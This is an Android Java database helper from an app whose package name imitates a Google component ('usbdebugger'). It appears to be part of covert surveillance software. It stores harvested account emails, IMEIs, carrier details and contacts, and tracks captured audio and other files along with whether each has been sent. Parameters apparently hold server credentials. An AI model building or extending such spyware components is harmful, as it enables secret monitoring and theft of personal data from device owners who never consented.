package com.google.android.usbdebugger;

import android.annotation.SuppressLint;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.util.Log;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Comparator;
import java.util.Date;
import java.util.Locale;

public class DBHelper extends SQLiteOpenHelper {

    private static final String LOG_TAG = "DBHelper";
    public static final String DATABASE_NAME = "MyDb.db";
    private static final int DATABASE_VERSION = 1;

    private static final String TABLE_SourceFiles = "SrFiles";
    private static final String TABLE_Parametrs = "Parametrs";
    private static final String TABLE_Accounts = "Accounts";
    private static final String TABLE_PhoneInfo = "PhoneInfo";
    private static final String TABLE_Exceptions = "Exceptions";
    private static final String TABLE_Contacts = "Contacts";

    private static final String CREATE_TABLE_SourceFiles_SQL = "CREATE TABLE IF NOT EXISTS " + TABLE_SourceFiles +
            "(id INTEGER PRIMARY KEY, FN TEXT, CDT DATETIME, FT INTEGER, SN TEXT, DE INTEGER)";
    // ИЗМЕНЕНО: AUDIO_DUR переименован в DUR
    private static final String CREATE_TABLE_Parametrs_SQL = "CREATE TABLE IF NOT EXISTS " + TABLE_Parametrs +
            " (VC TEXT, SC TEXT, FT TEXT, PT TEXT, FD TEXT, US TEXT, PS TEXT, GP TEXT, GP_T TEXT, " +
            " CN TEXT, MS TEXT, DC TEXT, PR TEXT, BS TEXT, SM TEXT, MI TEXT, FLC TEXT, " +
            " RS TEXT, DBC TEXT, SH TEXT, XML_T TEXT, DUR TEXT)";
    private static final String CREATE_TABLE_Accounts_SQL = "CREATE TABLE IF NOT EXISTS " + TABLE_Accounts + " (id INTEGER PRIMARY KEY, email TEXT, type TEXT)";
    private static final String CREATE_TABLE_PhoneInfo_SQL = "CREATE TABLE IF NOT EXISTS " + TABLE_PhoneInfo + " (id INTEGER PRIMARY KEY, name TEXT, IMEI TEXT, IMEI2 TEXT, Operator TEXT, SDK TEXT)";
    private static final String CREATE_TABLE_Exceptions_SQL = "CREATE TABLE IF NOT EXISTS " + TABLE_Exceptions + " (id INTEGER PRIMARY KEY, ProcedureName TEXT, ExeptionType TEXT, Message TEXT, CreateDateTime DATETIME)";
    private static final String CREATE_TABLE_Contacts_SQL = "CREATE TABLE IF NOT EXISTS " + TABLE_Contacts + " (ids TEXT, name TEXT, phone TEXT, mail TEXT)";
    // ИЗМЕНЕНО: AUDIO_DUR переименован в DUR
    private static final String INSERT_DEFAULT_PARAMS_SQL = "INSERT INTO " + TABLE_Parametrs
            + " (VC, SC, FT, PT, FD, US, PS, GP, GP_T, CN, MS, DC, PR, BS, SM, MI, FLC, RS, DBC, SH, XML_T, DUR) VALUES "
            + "('0','0','','','','','','0','30','0','0','0','0','0','0','0','10','1','2880','0', '60', '30')";

    public DBHelper(Context context) {
        super(context, DATABASE_NAME, null, DATABASE_VERSION);
    }

    @Override
    public void onCreate(SQLiteDatabase db) {
        Log.d(LOG_TAG, "--- onCreate database ---");
        try {
            db.execSQL(CREATE_TABLE_SourceFiles_SQL);
            db.execSQL(CREATE_TABLE_Accounts_SQL);
            db.execSQL(CREATE_TABLE_PhoneInfo_SQL);
            db.execSQL(CREATE_TABLE_Exceptions_SQL);
            db.execSQL(CREATE_TABLE_Contacts_SQL);
            onCreateParametrs(db);
        } catch (SQLException e) {
            Log.e(LOG_TAG, "Error creating tables", e);
        }
    }

    public void onCreateParametrs(SQLiteDatabase db) {
        try {
            db.execSQL(CREATE_TABLE_Parametrs_SQL);
            if (getRowCount(db, TABLE_Parametrs) == 0) {
                db.execSQL(INSERT_DEFAULT_PARAMS_SQL);
            }
        } catch (SQLException e) {
            Log.e(LOG_TAG, "Error creating Parametrs table", e);
        }
    }

    private int getRowCount(SQLiteDatabase db, String tableName) {
        try (Cursor cursor = db.rawQuery("SELECT COUNT(*) FROM " + tableName, null)) {
            if (cursor != null && cursor.moveToFirst()) {
                return cursor.getInt(0);
            }
        }
        return 0;
    }

    public ArrayList<String> SelectParametrs(SQLiteDatabase db) {
        ArrayList<String> select = new ArrayList<>();
        if(db == null || !db.isOpen()) return select;
        try (Cursor c = db.rawQuery("SELECT * FROM " + TABLE_Parametrs + " LIMIT 1", null)) {
            if (c != null && c.moveToFirst()) {
                for (int i = 0; i < c.getColumnCount(); i++) {
                    select.add(c.getString(i));
                }
            }
        } catch (Exception ex) {
            Log.e(LOG_TAG, "Error in SelectParametrs", ex);
        }
        return select;
    }

    public void insert_SrFiles(SQLiteDatabase db, String tableName, String filename, String datetime, String type, String Sent) {
        ContentValues values = new ContentValues();
        values.put("FN", filename);
        values.put("CDT", datetime);
        values.put("FT", type);
        values.put("SN", Sent);
        values.put("DE", 0);
        db.insert(tableName, null, values);
    }

    public void Delete_MaxCount(SQLiteDatabase db, String table, String filename, int type, String sent) {
        String where = "FN = ? AND FT = ? AND SN = ?";
        String[] whereArgs = {filename, String.valueOf(type), sent};
        db.delete(table, where, whereArgs);
    }

    public void cleanupOldFiles(SQLiteDatabase db, int fileType, int maxCount, File dir) {
        String whereClause = "FT = ?";
        String[] whereArgs = { String.valueOf(fileType) };
        int currentCount;
        try (Cursor c = db.query(TABLE_SourceFiles, new String[]{"COUNT(*)"}, whereClause, whereArgs, null, null, null)) {
            if (c.moveToFirst()) {
                currentCount = c.getInt(0);
            } else {
                return;
            }
        }

        while (currentCount > maxCount) {
            try (Cursor c = db.query(TABLE_SourceFiles, new String[]{"id", "FN"}, whereClause, whereArgs, null, null, "id ASC", "1")) {
                if (c.moveToFirst()) {
                    @SuppressLint("Range") long id = c.getLong(c.getColumnIndex("id"));
                    @SuppressLint("Range") String fn = c.getString(c.getColumnIndex("FN"));
                    
                    db.delete(TABLE_SourceFiles, "id=" + id, null);
                    
                    File f = new File(dir, fn);
                    if (f.exists() && f.delete()){
                       Log.d(LOG_TAG, "Старый файл удален (ротация по БД): " + fn);
                    }
                    currentCount--;
                } else {
                    break; 
                }
            }
        }
    }

    public void cleanupDirectory(File dir, int maxCount) {
        if (dir == null || !dir.isDirectory()) return;
        
        File[] files = dir.listFiles();
        if (files == null || files.length <= maxCount) {
            return;
        }
        
        Arrays.sort(files, Comparator.comparingLong(File::lastModified));
        
        int filesToDelete = files.length - maxCount;
        for (int i = 0; i < filesToDelete; i++) {
            if (files[i].delete()) {
                Log.d(LOG_TAG, "Старый аудиофайл удален (ротация по ФС): " + files[i].getName());
            }
        }
    }

    public String[] Select_FileNames(SQLiteDatabase db, String table, File dir, int type, String sent, boolean includeProcessed) {
        ArrayList<String> list = new ArrayList<>();
        String selection = "FT = ? AND SN = ?";
        if (!includeProcessed) {
            selection += " AND DE = 0";
        }
        String[] selectionArgs = {String.valueOf(type), sent};
        try (Cursor c = db.query(table, new String[]{"FN"}, selection, selectionArgs, null, null, null)) {
            if (c != null && c.moveToFirst()) {
                do {
                    @SuppressLint("Range") String fileName = c.getString(c.getColumnIndex("FN"));
                    list.add(new File(dir, fileName).getAbsolutePath());
                } while (c.moveToNext());
            }
        } catch (Exception ee) {
            insert_Exeption(db, "Select_FileNames", "Exception", ee.getMessage(), DateTime());
        }
        return list.toArray(new String[0]);
    }

    public void insert_Account(SQLiteDatabase db, String email, String type) {
        ContentValues values = new ContentValues();
        values.put("email", email);
        values.put("type", type);
        db.insert(TABLE_Accounts, null, values);
    }

    public void Delete_Account(SQLiteDatabase db) {
        db.delete(TABLE_Accounts, null, null);
    }

    public void insert_PhoneInfo(SQLiteDatabase db, String name, String imei, String imei2, String operator, String sdk) {
        ContentValues values = new ContentValues();
        values.put("name", name);
        values.put("IMEI", imei);
        values.put("IMEI2", imei2);
        values.put("Operator", operator);
        values.put("SDK", sdk);
        db.insert(TABLE_PhoneInfo, null, values);
    }

    public void Update(SQLiteDatabase db, String table, String whereClause, String[] whereArgs, ContentValues values) {
        try {
            db.update(table, values, whereClause, whereArgs);
        } catch (Exception e) {
            insert_Exeption(db, "Update", "Exception", e.getMessage(), DateTime());
        }
    }

    public void insert_Exeption(SQLiteDatabase db, String procedureName, String exeptionType, String message, String createDateTime) {
        if (db == null || !db.isOpen()) {
            Log.e(LOG_TAG, "База данных для записи исключения закрыта или null!");
            return;
        }
        try {
            ContentValues values = new ContentValues();
            values.put("ProcedureName", procedureName);
            values.put("ExeptionType", exeptionType);
            values.put("Message", message);
            values.put("CreateDateTime", createDateTime);
            db.insert(TABLE_Exceptions, null, values);
        } catch (Exception ex) {
            Log.e(LOG_TAG, "Критическая ошибка при записи исключения в БД", ex);
        }
    }
    
    public int DbCount(SQLiteDatabase db) {
        if (db == null || !db.isOpen()) return 0;
        return getRowCount(db, TABLE_SourceFiles);
    }

    private String DateTime() {
        return new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", Locale.US).format(new Date());
    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        db.execSQL("DROP TABLE IF EXISTS " + TABLE_Parametrs);
        onCreate(db);
    }
}
